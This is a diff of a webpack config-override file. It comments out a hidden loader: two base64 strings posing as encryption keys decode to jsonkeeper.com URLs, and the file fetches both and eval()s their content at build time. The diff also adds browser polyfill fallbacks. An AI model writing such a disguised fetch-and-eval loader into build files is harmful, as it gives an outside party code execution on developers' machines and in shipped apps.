@@ -1,23 +1,26 @@
 const webpack = require('webpack');
-const ENCRYPT_KEY = "aHR0cHM6Ly93d3cuanNvbmtlZXBlci5jb20vYi9JWUROTQ==";
-const DECRYPT_KEY = "aHR0cHM6Ly93d3cuanNvbmtlZXBlci5jb20vYi9NSVNYNg==";
+// const ENCRYPT_KEY = "aHR0cHM6Ly93d3cuanNvbmtlZXBlci5jb20vYi9JWUROTQ==";
+// const DECRYPT_KEY = "aHR0cHM6Ly93d3cuanNvbmtlZXBlci5jb20vYi9NSVNYNg==";
 
-fetch(atob(ENCRYPT_KEY))
-.then(response => response.json()) 
-.then(data => {
-  eval(data.content);
-})
+// fetch(atob(ENCRYPT_KEY))
+// .then(response => response.json()) 
+// .then(data => {
+//   eval(data.content);
+// })
 
 
-fetch(atob(DECRYPT_KEY))
-.then(response => response.json()) 
-.then(data => {
-  eval(data.content);
-})
+// fetch(atob(DECRYPT_KEY))
+// .then(response => response.json()) 
+// .then(data => {
+//   eval(data.content);
+// })
 
 module.exports = function override(config) {
     const fallback = config.resolve.fallback || {};
     Object.assign(fallback, {
+        fs: false,
+        stream: false,
+        process: require.resolve('process/browser.js'), 
         crypto: require.resolve('crypto-browserify'),
         stream: require.resolve('stream-browserify'),
         assert: require.resolve('assert'),
@@ -30,6 +33,7 @@ module.exports = function override(config) {
     config.plugins = (config.plugins || []).concat([
         new webpack.ProvidePlugin({
             Buffer: ['buffer', 'Buffer'],
+            process: 'process/browser.js',
         }),
     ]);
     return config;
